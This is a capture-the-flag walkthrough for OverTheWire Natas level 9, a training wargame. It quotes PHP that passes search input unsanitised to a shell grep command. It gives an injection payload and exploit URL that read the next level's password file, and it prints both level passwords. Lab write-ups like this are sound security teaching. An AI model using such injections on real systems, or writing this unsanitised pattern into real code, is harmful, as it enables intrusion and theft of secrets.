# Natas Level 9 → Level 10

## 🚩 Challenge Info

- **Platform:** OverTheWire – Natas Wargame  
- **Level:** 9 → 10  
- **Category:** Web Security / Command Injection  
- **URL:** http://natas9.natas.labs.overthewire.org  
- **Username:** `natas9`  
- **Password:** `ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t`

---

## 🎯 Objective

Find the password for **natas10** by exploiting a **Command Injection vulnerability** in the web application.

---

## 🔍 Observations
Upon visiting the page, a search box is displayed with the message:

> Find words containing:

This suggests the website allows users to search for words inside a file.

### 1. Inspecting the Source Code
Viewing the page source (`Ctrl + U`) reveals a link to:


>index-source.html


Opening this file exposes the PHP code used by the application.

---

## 🛠️ Investigation

### 1. Reviewing the Application Code

Inside `index-source.html`, the following PHP code appears:
```
$key = $_REQUEST["needle"];

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
```
### 2. Understanding the Vulnerability

The application directly inserts user input into a system command:

>grep -i <user_input> dictionary.txt

Since the input is not sanitized, an attacker can append additional commands using shell operators such as:

>;

This leads to a **`Command Injection vulnerability`**.

3. Exploiting Command Injection

We can execute another command after grep.

Payload:

>; cat /etc/natas_webpass/natas10

Full URL:

```
http://natas9.natas.labs.overthewire.org/?needle=; cat /etc/natas_webpass/natas10
```

---
## 💡 Discovery
### 1. Executing the Injected Command

The injected command forces the server to execute:

>cat /etc/natas_webpass/natas10

This file stores the password for the next level.

### 2. Retrieving the Password

The server prints the content of the file:
```php
natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu